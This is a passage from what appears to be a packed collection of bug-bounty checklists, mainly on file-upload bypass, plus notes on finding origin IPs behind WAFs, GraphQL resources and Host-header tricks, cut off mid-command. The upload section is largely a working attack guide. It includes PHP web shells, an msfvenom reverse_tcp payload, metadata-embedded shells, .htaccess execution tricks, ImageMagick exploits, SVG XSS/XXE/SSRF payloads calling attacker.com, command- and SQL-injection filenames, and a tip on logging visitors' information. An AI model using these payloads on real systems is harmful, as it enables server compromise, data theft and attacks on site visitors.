SSRF, XXE\r\n    - `GIF`: Stored XSS, SSRF\r\n    - `CSV`: CSV injection\r\n    - `XML`: XXE\r\n    - `AVI`: LFI, SSRF\r\n    - `HTML`, `JS` : HTML injection, XSS, Open redirect\r\n    - `PNG`, `JPEG`: Pixel flood attack (DoS)\r\n    - `ZIP`: RCE via LFI, DoS\r\n    - `PDF`, `PPTX`: SSRF, BLIND XXE\r\n    - `SCF` : RCE\r\n\r\n## Types of Validation in File-Upload:\r\n\r\nThere several others too but this are the main 5 types others are like File Signature Validation,File Content Validation, File Storage Location which all comes in further protection.\r\n\r\n### 1. Client-Side Validation:\r\n\r\n- Client side validation is a type of validation which takes place before the inputs are actually\r\nsent to the server. And it happens on the web browser by JavaScript, VBScript, or HTML5\r\nattributes. Programmers use this type of validation to provide better user experience by\r\nresponding quickly at the browser level.\r\n- For Example `Error only .jpg is allowed`\r\n\r\n### 2. File Name Validation:\r\n\r\n- File name validation is when the server validate the file that being uploaded by checking\r\nits extension, this validation happens based on many methods, but two of the most popular\r\nmethods are Blacklisting File Extensions and Whitelisting File Extensions.\r\n- Blacklisting File extensions is a type of protection where only a specific extensions are being\r\nrejected from the server, Such as php, aspx. While Whitelisting File extensions is the exact\r\nopposite, which is only a few file extensions are allowed to be uploaded to the server, Such as\r\njpg, jpeg, gif.\r\n\r\n### 3. Content-type / MIME-type Validation:\r\n\r\n- Content-Type validation is when the server validate the content of the file by checking the\r\nMIME type of the file, which can be shown in the http request. For example, some image file\r\nuploads validate the images uploaded by checking if the Content-Type of the file is an image type.\r\n- For Example: `Content-type: image/png`\r\n\r\n### 4. Content-Length Validation:\r\n\r\n- Content-Length validation is when the server checks the length of the content of the\r\nuploaded file and restricts a file size that can’t be exceeded, Although this type of validation is\r\nnot very popular, But it can be shown on some file uploads.\r\n- For Example: `Not allow file size greater than 10 bytes`\r\n\r\n### 5. Checking the Image Header:\r\n\r\n- When image upload only is allowed, most web applications usually validate the image header by using a server-side function such as `getimagesize()` in PHP. When called, this function will return the size of an image. If the file is not a valid image, meaning that the file header is not that of an image, the function will return FALSE. Therefore, several web applications typically check if the function returns TRUE or FALSE and validate the uploaded file using this information.\r\n- This can be bypassed by using magic numbers\r\n\r\n[List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)\r\n\r\n# Testing For File-Upload and Exploiting.\r\n\r\n[object Promise]\r\n\r\n## Base Step\r\n\r\n```markdown\r\n1. Browse the site and find each upload functionality.\r\n2. Start with basic test by simply uploading a web shell using Weevely\r\n\t`weevely generate <password> <path>`\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tOR\r\n\t Use Msfvenom `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`\r\n3. Try the extension bypasses if that fails\r\n4. Try changing content-type to bypass\r\n5. Try Magic number bypass \r\n6. Try Polygot or PNG IDAT chunks bypass\r\n7. Finally if successful then upload small POC or exploit further.\r\n```\r\n\r\n## Test Case - 1: Blacklisting Bypass.\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Now start testing which extension for the file is blacklisted, change the `filename=` Parameter\r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\r\nContent-Type: application/x-php\r\n\r\n3. Try all of this extension \r\n\r\n**PHP** → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc\r\n**ASP** → asp, .aspx, .cer, .asa\r\n**Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf\r\n**Coldfusion** → .cfm, .cfml, .cfc, .dbm\r\n**Using random capitalization** → .pHp, .pHP5, .PhAr\r\n\r\nFind more in PayloadAllThings and https://book.hacktricks.xyz/pentesting-web/file-upload\r\n\r\n4. If successful then exploit further, or there might be other type of validation or \r\n\t check so try other bypass.\r\n```\r\n\r\n## Test Case - 2: Whitelisting Bypass\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Now start testing which extension for the file is whitelisted, change the `filename=` Parameter\r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.jpg\"\r\nContent-Type: application/x-php\r\n\r\n3. Try all of this extension \r\n\r\nfile.jpg.php\r\nfile.php.jpg\r\nfile.php.blah123jpg\r\nfile.php%00.jpg\r\nfile.php\\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.\r\nfile.php%00\r\nfile.php%20\r\nfile.php%0d%0a.jpg\r\nfile.php.....\r\nfile.php/\r\nfile.php.\\\r\nfile.php#.png\r\nfile.\r\n.html\r\n\r\n4. If doesn't works then try to bruteforce using intruder which extension are accepted and try again\r\n5. If successful then exploit further, or there might be other type of validation or \r\n\t check so try other bypass.\r\n```\r\n\r\n## Test Case - 3: Content-type validation\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Upload file.php and change the Content-type: application/x-php or Content-Type : application/octet-stream to Content-type: image/png or Content-type: image/gif or Content-type: image/jpg\r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\r\nContent-Type: application/x-php\r\n\r\n3. If successful then exploit further, or there might be other type of validation or \r\n\t check so try other bypass.\r\n```\r\n\r\n## Test Case - 4: Content-Length validation\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Try all three above bypass first, if they doesn't works then see if file size is been\r\n\t checked. Try all four of this case in combo for more success rate.\r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\r\nContent-Type: application/x-php\r\n\r\n[...]\r\n\r\n3. Try small file payload like \r\n\r\n<?=`$_GET[x]`?>   \r\n<?=‘ls’;   Note : <? work for “short_open_tag=On” in php.ini ( Default=On )\r\n\r\n4. Finally the request should look like this. if this worked then try to access this file\r\n\t For Example: http://example.com/compromised_file.php?x=cat%20%2Fetc%2Fpasswd \r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\r\nContent-Type: application/x-php\r\n\r\n<?=`$_GET[x]`?>\r\n\r\n5. Dont stop here, upload better shell and try to see if you can find something more \r\n\t critical like DB_.\r\n```\r\n\r\n## Test Case - 5: Content Bypass / Using Magic Bytes\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Try all Four above bypass first, if they doesn't works then see if file content is been\r\n\t checked. Try all five of this case in combo for more success rate.\r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\r\nContent-Type: application/x-php\r\n\r\n[...]\r\n\r\n3. Change the Content-Type: application/x-php to Content-Type: image/gif and Add the \r\n\t text \"GIF89a;\" before you shell-code.\r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a; <?php system($_GET['cmd']); ?>\r\n\r\n4. Try more from here https://en.wikipedia.org/wiki/List_of_file_signatures and change \r\n\t Content-Type: accordingly\r\n5. If successful upload better Shell and POC, and see how can you increase critically.\r\n```\r\n\r\n## Test Case - 6: Magic Bytes and Metadata Shell\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Try all above bypass first, if they doesn't works then see if file content is been\r\n\t checked. Try all six of this case in combo for more success rate.\r\n\r\nPOST /images/upload/ HTTP/1.1\r\nHost: target.com\r\n[...]\r\n\r\n---------------------------829348923824\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"dapos.php\"\r\nContent-Type: application/x-php\r\n\r\n[...]\r\n\r\n4. First Bypass Content-Type checks by setting the value of the \r\n\t Content-Type header to: image/png , text/plain , application/octet-stream\r\n5. Introduce the shell inside the metadata using tool exiftool.\r\n\r\nexiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg\r\n\r\n6. Now try uploading this modified img.jpg\r\n7. Exploit further to increase critically.\r\n```\r\n\r\n## Test Case - 7: Uploading Configuration Files\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Now try to upload .htaccess file if the app is using php server or else\r\n\t try to upload .config is app is using ASP server\r\n3. If you can upload a .htaccess, then you can configure several things and \r\n\t even execute code (configuring that files with extension .htaccess can be executed).\r\n\t Different .htaccess shells can be found here: https://github.com/wireghoul/htshells\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tOR\r\n\t If you can upload .config files and use them to execute code. One way to do it \r\n\t is appending the code at the end of the file inside an HTML comment: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config\r\n\t More information and techniques to exploit this vulnerability here: https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/\r\n4. Try to exploit now that server config is changed upload the shell \r\n\t For example if you uploaded .htaccess file with \r\n\t AddType application/x-httpd-php .png in content this configuration would instruct \r\n\t the Apache HTTP Server to execute PNG images as though they were PHP scripts.\r\n5. Now simply upload our php shell file with extension .png \r\n6. Done, try to exploit further.\r\n```\r\n\r\n## Test Case - 8: Try Zip Slip Upload\r\n\r\n```markdown\r\n1. Find the upload request and send it to the repeater\r\n2. Now check if .zip file is allowed to upload \r\n3. If a site accepts .zip file, upload .php and compress it into .zip and upload it.\r\n4. Now visit, site.com/path?page=zip://path/file.zip%23rce.php\r\n\r\nIf you also try this tool and info here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip\r\n```\r\n\r\n## Test Case -9 : Try ImageMagick\r\n\r\n```markdown\r\nCheck Reference : https://hackerone.com/reports/302885 , https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e\r\n1. Find the upload functionality like profile pic upload.\r\n2. Git clone https://github.com/neex/gifoeb in you system.\r\n3. Goto gifoeb directory and run this command.\r\n\r\n./gifoeb gen 512x512 dump.gif\r\n\r\n   This will create exploitable dump.gif file where 512x512 is pixel dimension and \r\n\t dump.gif is an gif file.\r\n\r\n   You can also try to bypass some checks.\r\n\r\n\t a) ./gifoeb gen 1123x987 dump.jpg\r\n\t b) ./gifoeb gen 1123x987 dump.png\r\n\t c) ./gifoeb gen 1123x987 dump.bmp\r\n\t d) ./gifoeb gen 1123x987 dump.tiff\r\n\t e) ./gifoeb gen 1123x987 dump.tif\r\n\r\n\t(It will create the dump files with different extensions. Try with which site works)\r\n4. After creation of exploitable files, just upload in the profile settings. \r\n\t using modified Image files.\r\n5. Server will return different pixel files. Download this file.\r\n6. Save and recover the pixel files.\r\n\t \r\n\tfor p in previews/*; do\r\n    ./gifoeb recover $p | strings;\r\n\tdone\r\n\r\n7. More details here https://github.com/neex/gifoeb\r\n\r\n########################### Another Different method #############################\r\n\r\nReference : https://www.exploit-db.com/exploits/39767 , https://hackerone.com/reports/135072\r\n\r\n1. Find Upload functionality.\r\n2. Make a file with .mvg extension and add below code in it.\r\n\r\npush graphic-context\r\nviewbox 0 0 640 480\r\nfill 'url(http://example.com/)'\r\npop graphic-context\r\n\r\nHere example.com can be your burp collab url or your site were you can receive HTTP request.\r\n3. Now use below command \r\n\r\nconvert ssrf.mvg out.png\r\n\r\n4. Upload the image and see if you received http request.\r\n\r\nFind ready made and more payloads here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik\r\n```\r\n\r\n## Exploitation:\r\n\r\n### XSS:\r\n\r\n```markdown\r\nThere are multiple ways to achieve XSS.\r\n\r\n1. Set file name filename=\"svg onload=alert(document.domain)>\" , filename=\"58832_300x300.jpg<svg onload=confirm()>\"\r\n2. Upload using .gif file\r\n\r\nGIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\r\n\r\n3. Upload using .svg file\r\n\r\n```\r\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>\r\n```\r\n\r\n```\r\n<?xml version=\"1.0\" standalone=\"no\"?>\r\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\r\n\r\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\r\n   <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\r\n   <script type=\"text/javascript\">\r\n      alert(\"HolyBugx XSS\");\r\n   </script>\r\n</svg>\r\n```\r\n```\r\n\r\n### OpenRedirection:\r\n\r\n```markdown\r\nUpload using .svg file\r\n\r\n<code>\r\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n<svg\r\nonload=\"window.location='https://attacker.com'\"\r\nxmlns=\"http://www.w3.org/2000/svg\">\r\n<rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\r\n</svg>\r\n</code>\r\n```\r\n\r\n### XXE:\r\n\r\n```markdown\r\n1. Upload using .svg file\r\n```\r\n<?xml version=\"1.0\" standalone=\"yes\"?>\r\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>\r\n<svg width=\"500px\" height=\"500px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\r\n   <text font-size=\"40\" x=\"0\" y=\"16\">&xxe;</text>\r\n</svg>\r\n```\r\n\r\n```\r\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">\r\n    <image xlink:href=\"expect://ls\"></image>\r\n</svg>\r\n```\r\n\r\n2. Using excel file you can acheive not only XXE, but other vulnerability too.\r\nhttps://medium.com/@rezaduty/security-issues-in-import-export-functionality-5d8e4b4e9ed3\r\n```\r\n\r\n### SSRF:\r\n\r\n```markdown\r\n1. Abusing the \"Upload from URL\", if this image is going to be saved in some public site, \r\n\t you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.\r\n\r\n2. SSRF Through .svg file.\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"><image height=\"200\" width=\"200\" xlink:href=\"https://attacker.com/picture.jpg\" /></svg>\r\n```\r\n\r\n### Command Injection:\r\n\r\n```markdown\r\n1. Set filename ; sleep 10;\r\n```\r\n\r\n### LFI:\r\n\r\n```markdown\r\n1. Set filename ../../etc/passwd/logo.png\r\n2. Set filename ../../../logo.png as it might changed the website logo.\r\n```\r\n\r\n### SQL Injection:\r\n\r\n```markdown\r\n1. Set filename 'sleep(10).jpg\r\n2. Set filename sleep(10)-- -.jpg\r\n```\r\n\r\n### DOS:\r\n\r\n```markdown\r\n1. Pixel flood attack using image, upload this image and Boom!!\r\nhttps://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/lottapixel.jpg\r\nhttps://hackerone.com/reports/390#:~:text=By%20loading%20the%20'whole%20image,Photo%20Viewer%20on%20my%20computer.\r\n\r\n2. DoS with a large values name: 1234...99.png \r\n```\r\n\r\n**SSTI:**\r\n\r\n```python\r\n\r\n```\r\n\r\n# Mitigation\r\n\r\nFile upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:\r\n\r\n- Use a server-generated filename if storing uploaded files on disk.\r\n- Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.\r\n- Enforce a whitelist of accepted, non-executable file extensions.\r\n- If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.\r\n- Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server’s configuration).\r\n- Reject attempts to upload archive formats such as ZIP.\r\n\r\n# Mind-Map\r\n\r\n[object Promise]\r\n\r\n\r\n# Tools And Payload.\r\n\r\n[barrracud4/image-upload-exploits](https://github.com/barrracud4/image-upload-exploits)\r\n\r\n[almandin/fuxploider](https://github.com/almandin/fuxploider)\r\n\r\n[PortSwigger/upload-scanner](https://github.com/PortSwigger/upload-scanner)\r\n\r\n# Reference\r\n\r\n[Interesting Test Cases of File uploading vulnerabilities](https://akash-venky091.medium.com/interesting-test-cases-of-file-uploading-vulnerabilities-3ad47f9e6149)\r\n\r\n[File upload tricks and checklist](https://www.onsecurity.io/blog/file-upload-checklist)\r\n\r\n[File Upload Attacks (Part 1) - Global Bug Bounty Platform](https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/)\r\n\r\n[Unrestricted File Upload In PHP](https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698)\r\n\r\n[File Upload - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)\r\n\r\n[](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)\r\n\r\n[Comprehensive Guide on Unrestricted File Upload](https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/)\r\n\r\n[HolyBugx/HolyTips](https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md)\r\n\r\n[Exploiting file upload vulnerabilities in web applications](https://infosecwriteups.com/web-application-analysis-exploiting-file-upload-vulnerabilities-cf48f79d51e)\r\n\r\n[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)\r\n\r\n[Art of Unrestricted File Upload Exploitation](https://bugdisclose.medium.com/art-of-unrestricted-file-upload-exploitation-92ed28796d0)\r\n\r\n[File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)\r\n\r\n[Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)\r\n\r\n[Uploading Backdoor For Fun And Profit. (RCE + DB-cred = P1)](https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125)\r\n\r\n[Unrestricted File Uploading Vulnerability - Secnhack](https://secnhack.in/unrestricted-file-uploading-vulnerability/)\r\n\r\n# Tips\r\n\r\n```markdown\r\nWAF bypass Tips by \r\n@0xInfection\r\nCase: File Upload (.php blocked)\r\n\r\n/?file=xx.php    <- Blocked\r\n/?file===xx.php  <- Bypassed\r\n\r\nThe file got uploaded successfully.\r\n```\r\n\r\n[https://pbs.twimg.com/media/EpkPLYXVgAMLhZa?format=jpg&name=medium](https://pbs.twimg.com/media/EpkPLYXVgAMLhZa?format=jpg&name=medium)\r\n\r\n```markdown\r\nBypass File Upload Filtering\r\n\r\nIn image :\r\n\r\nexiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' shell.jpg \r\n\r\nmv shell.jpg  shell.php.jpg\r\n```\r\n\r\n[https://pbs.twimg.com/media/Eq9dOoaXUAAEE8n?format=jpg&name=900x900](https://pbs.twimg.com/media/Eq9dOoaXUAAEE8n?format=jpg&name=900x900)\r\n\r\n## Author:\r\n[KathanP19](https://twitter.com/KathanP19)\r\n"
    },
    {
      "old_file_upload_bypass.md": "# Bypassing File Uploads\r\n\r\nSuppose you have a limitation that you can only upload in a few formats like PDF, JPEG, JPG, ….But what if you can upload a PHP file by defying the Upload mechnism and validation of file type check. let me tell you if someone can upload a PHP file then its game over for the website as he will upload a php shell and can easily perform an RCE , or Worst will simply gain a reverse shell on the server.\r\n\r\n> __How does Bypass work__\r\n\r\nWell it depends on which kind of validation the system is using …it is just verfying the extension ?? if its just doing that then it becomes very easy to bypass and upload a PHP file or something malicious. suppose we have to upload a JPG file so the extension must be something.jpg\r\n\r\n---\r\n\r\n\r\n### 1. Bypassing Normal extension\r\nNow what we can do is we can upload a file which looks like this something.php.jpg or somethings.jpg.php.\r\n### 2. Bypassing the magic Byte validation.\r\n\r\nFor this method we use polygots. Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a GIFAR is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.\r\n\r\nso while we have to upload a JPEG file type we actaully can upload a PHAR-JPEG file which will appear to be a JPEg file type to the server while validating. the reason is the file PHAR-JPEg file has both the JPEG header and the PHP file also. so while uploading it didn’t get detected and later after processing the PHP file can be used to exploit.\r\n\r\nAnd at last Uploading a shell to some random websites for fun is not really cool so don’t ever try untill unless you have the permission to test.\r\n\r\n## 3. Path traversal Upload\r\nupload file with filename as:\r\n    \r\n    ../test.png \r\n    ..%2Ftest.png\r\n\r\n-----\r\n\r\n\r\n**How the bypass was possible?**\r\n\r\n1. Create a malicious file with an extension that is accepted by the application.\r\n2. Upload that file and click on send.\r\n3. Capture the request in any proxy tool, edit the file extension to the malicious extension that you want. In some cases, you might need to change the content type of a file.\r\n4. Forward the request to the server.\r\n\r\n------\r\n\r\n**Test PDF upload functionality.**\r\n\r\n- [https://github.com/jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf)\r\n\r\nResources :-\r\n\r\n- [File upload Bypass pdf](https://harshitsengar.in/resources/File%20Upload%20Bypass%20.pdf)\r\n"
    }
  ],
  "FindOriginIP": [
    {
      "FindOrigin.md": "**Identifying a WAF**\r\n```\r\ndig +short example.com\r\ncurl -s https://ipinfo.io/IP | jq -r '.org'\r\n```\r\n\r\n-  With AWS, you can often identify a load balancer with the presence of \"AWSLB\" and \"AWSLBCORS\" cookies\r\n\r\n**Identifying the source**\r\n\r\n- Use https://dnsdumpster.com to generate a map.\r\n\r\n- Next, make a search using Censys and save the IP's that look to match your target in a text file.\r\nExample: https://censys.io/ipv4?q=0x00sec.org\r\n\r\n- Another way you can find IP's tied to a domain is by viewing their historical IPs. You can do this with SecurityTrails DNS trails. \r\nhttps://securitytrails.com/domain/0x00sec.org/dns\r\n\r\n\t-\tHere we can see what A records existed and for how long. It is so common for an administrator to switch to a WAF solution after X amount of years of using it bare-metal, and do you think they configure whitelisting? No of course not, it works fine!\r\n\t-\tyou can just copy the entire table(Select full table and copy paste it in a txt file) body and use awk to filter the IP's out.\r\n\t\t\r\n\t\t`grep -E -o \"([0-9]{1,3}[\\\\.]){3}[0-9]{1,3}\" tails.txt | sort -u | tee -a ips.txt`\r\n\t\t\r\n**DNS Enumeration**\r\n\t\t\r\n\tIf you enumerate your targets DNS, you may find that they have something resembling a dev.example.com or staging.example.com subdomain, and it may be pointing to the source host with no WAF. \r\n\t\t\r\n\t- Get all the subdomains.\r\n\t\t`subfinder -silent -d 0x00sec.org | dnsprobe -silent | awk  '{ print $2 }'  | sort -u | tee -a ips.txt`\r\n\t\t\r\n**Checking IP's for hosts**\r\n\r\n\r\n```\r\nfor ip in $(cat ips.txt) # iterate through each line in file\r\ndo \r\n\torg=$(curl -s <https://ipinfo.io/$ip> | jq -r '.org') #  Get Org from IPInfo\r\n  title=$(timeout 2 curl -s -k -H \"Host: 0x00sec.org\" <https://$ip/> | pup 'title text{}') # Get title\r\n\techo \"IP: $ip Title: $title Org: $org\" # Print results\r\ndone \r\n```\r\nin one line, same command:\r\n`for ip in $(cat ips.txt); do org=$(curl -s <https://ipinfo.io/$ip> | jq -r '.org'); title=$(timeout 2 curl --tlsv1.1 -s -k -H \"Host: 0x00sec.org\" <https://$ip/> | pup 'title text{}'); echo \"IP: $ip Title: $title Org: $org\"; done`\r\n\r\n\r\n- What we have now is a quick overview of which IP's respond to which Host header, and we can view the title\r\n- We went through each host, requested the IP directly with the host header, and we have our source IP!\r\n\r\n**Setting the Host Header manually**\r\n`curl -s -k -H \"Host: 0x00sec.org\" https://<ip address>/`\r\n\r\nor set Host Header in burp.\r\n\r\n**CloudFail** \r\n\r\n```\r\ngit clone <https://github.com/m0rtem/CloudFail.git>\r\ncd CloudFail\r\npip install -r requirements.txt\r\npython3 cloudfail.py -t 0x00sec.org\r\n```\r\n\r\n**But first, Recon!**\r\n- The idea is to start your normal recon process and grab as many IP addresses as you can (host, nslookup, whois, ranges…), then check which of those servers have a web server enabled (netcat, nmap, masscan). \r\n- Once you have a list of web server IP, the next step is to check if the protected domain is configured on one of them as a virtual host.\r\n\r\n**Censys**\r\n-  Choose “Certificates” in the select input, provide the domain of your target, then hit \\<enter\\>\r\n-  You should see a list of certificates that fit to your target\r\n-  Click on every result to display the details and, in the “Explore” menu at the very right, choose “IPv4 Hosts”.\r\n-  You should be able to see the IP addresses of the servers that use the certificate\r\n-  From here, grab all IP you can and, back to the previous chapter, try to access your target through all of them.\r\nexample: \r\n`curl -s -k -H \"Host: 0x00sec.org\" https://<ip address>/`\r\n\r\n**Mail headers**\r\n- The next step is to retrieve the headers in the mails issued by your target: Subscribe the newsletter, create an account, use the function “forgotten password”, order something… in a nutshell do whatever you can to get an email from the website you’re testing \r\n- Once you get an email, check the source, and especially the headers. Record all IPs you can find there, as well as subdomains, that could possibly belong to a hosting service. And again, try to access your target through all of them.\r\n\r\nThe value of header Return-Path worked pretty well\r\n\r\nTool: https://github.com/christophetd/CloudFlair\r\nThis tools works on censys data.\r\n\r\nReferences:\r\nhttps://delta.navisec.io/a-pentesters-guide-part-5-unmasking-wafs-and-finding-the-source/\r\nhttps://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/\r\n\r\n# Authors\r\n* [@maverickNerd](https://twitter.com/maverickNerd)\r\n"
    }
  ],
  "GraphQL": [
    {
      "GraphQL.md": "## Videos\r\n- GraphQL Video - [InsiderPhd](https://www.youtube.com/watch?v=GlvNwhq-uBg)\r\n- [REST in Peace: Abusing GraphQL to Attack Underlying Infrastructure - LevelUp 0x05](https://www.youtube.com/watch?v=NPDp7GHmMa0)\r\n\r\n## Blogs\r\n- Exploit GraphQL - [Yeswehack Blog](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/)\r\n- Hacking GraphQL - [Part 1](https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-1-understanding-graphql-basics-72bb3dd22efa) [Part 2](https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-2-methodology-and-examples-5992093bcc24)\r\n- [That single GraphQL issue that you keep missing](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) by [Doyensec](https://www.doyensec.com/)\r\n- [Reverse engineer a GraphQL API](https://swizec.com/blog/reverse-engineer-a-graphql-api-to-automate-love-notes-codewithswiz-24)\r\n- [Exploiting GraphQL](https://blog.assetnote.io/2021/08/29/exploiting-graphql/) by [Assetnote](https://assetnote.io/)\r\n- [GraphQL Resources Thread](https://twitter.com/holybugx/status/1441460070387261440?s=21) by [HolyBugx](https://twitter.com/HolyBugx)\r\n\r\n# Tools\r\n- [GraphQL Voyager](https://apis.guru/graphql-voyager/)\r\n- [GraphQL Cheatsheet](https://devhints.io/graphql)\r\n- [AutoGraphQL](https://graphql-dashboard.herokuapp.com/) -  Demo [Video ](https://www.youtube.com/watch?v=JJmufWfVvyU)\r\n- [graphw00f](https://github.com/dolevf/graphw00f) - GraphQL Server Engine Fingerprinting utility to learn more about what technology is behind a given GraphQL endpoint\r\n-[InQL - Introspection GraphQL Scanner](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f) - A security testing tool to facilitate GraphQL technology security auditing efforts\r\n\r\n# Labs\r\n- Damn-Vulnerable-GraphQL-Application - [Github](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)\r\n"
    }
  ],
  "Host-Header": [
    {
      "Host-Header.md": "# Summary For Host Header\r\n[object Promise]\r\n\r\n# Also Check This Things While Testing\r\n1. Add two `HOST:` in Request.\r\n2. Try this Headers\r\n    ```      \r\n       X-Original-Url:\r\n       X-Forwarded-Server:\r\n       X-Host:\r\n       X-Forwarded-**Host**:\r\n       X-Rewrite-Url:\r\n    ```\r\n3. If you come across `/api.json` in any AEM instance during bug hunting, try for web cache poisoning via following  \r\n  `Host: , X-Forwarded-Server , X-Forwarded-Host:`\r\n   and or simply try https://localhost/api.json HTTP/1.1\r\n4. Also try `Host: redacted.com.evil.com`\r\n5. Try Host: evil.com/redacted.com\r\n[https://hackerone.com/reports/317476](https://hackerone.com/reports/317476)\r\n6. Try this too `Host: example.com?.mavenlink.com`\r\n7. Try `Host: javascript:alert(1);` Xss payload might result in debugging mode.\r\n[https://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html](https://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)\r\n8. Host Header to Sqli\r\n[https://blog.usejournal.com/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610](https://blog.usejournal.com/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610)\r\n9. Bypass front server restrictions and access to forbidden files and directories through `X-Rewrite-Url/X-original-url:` \r\n   `curl -i -s -k -X 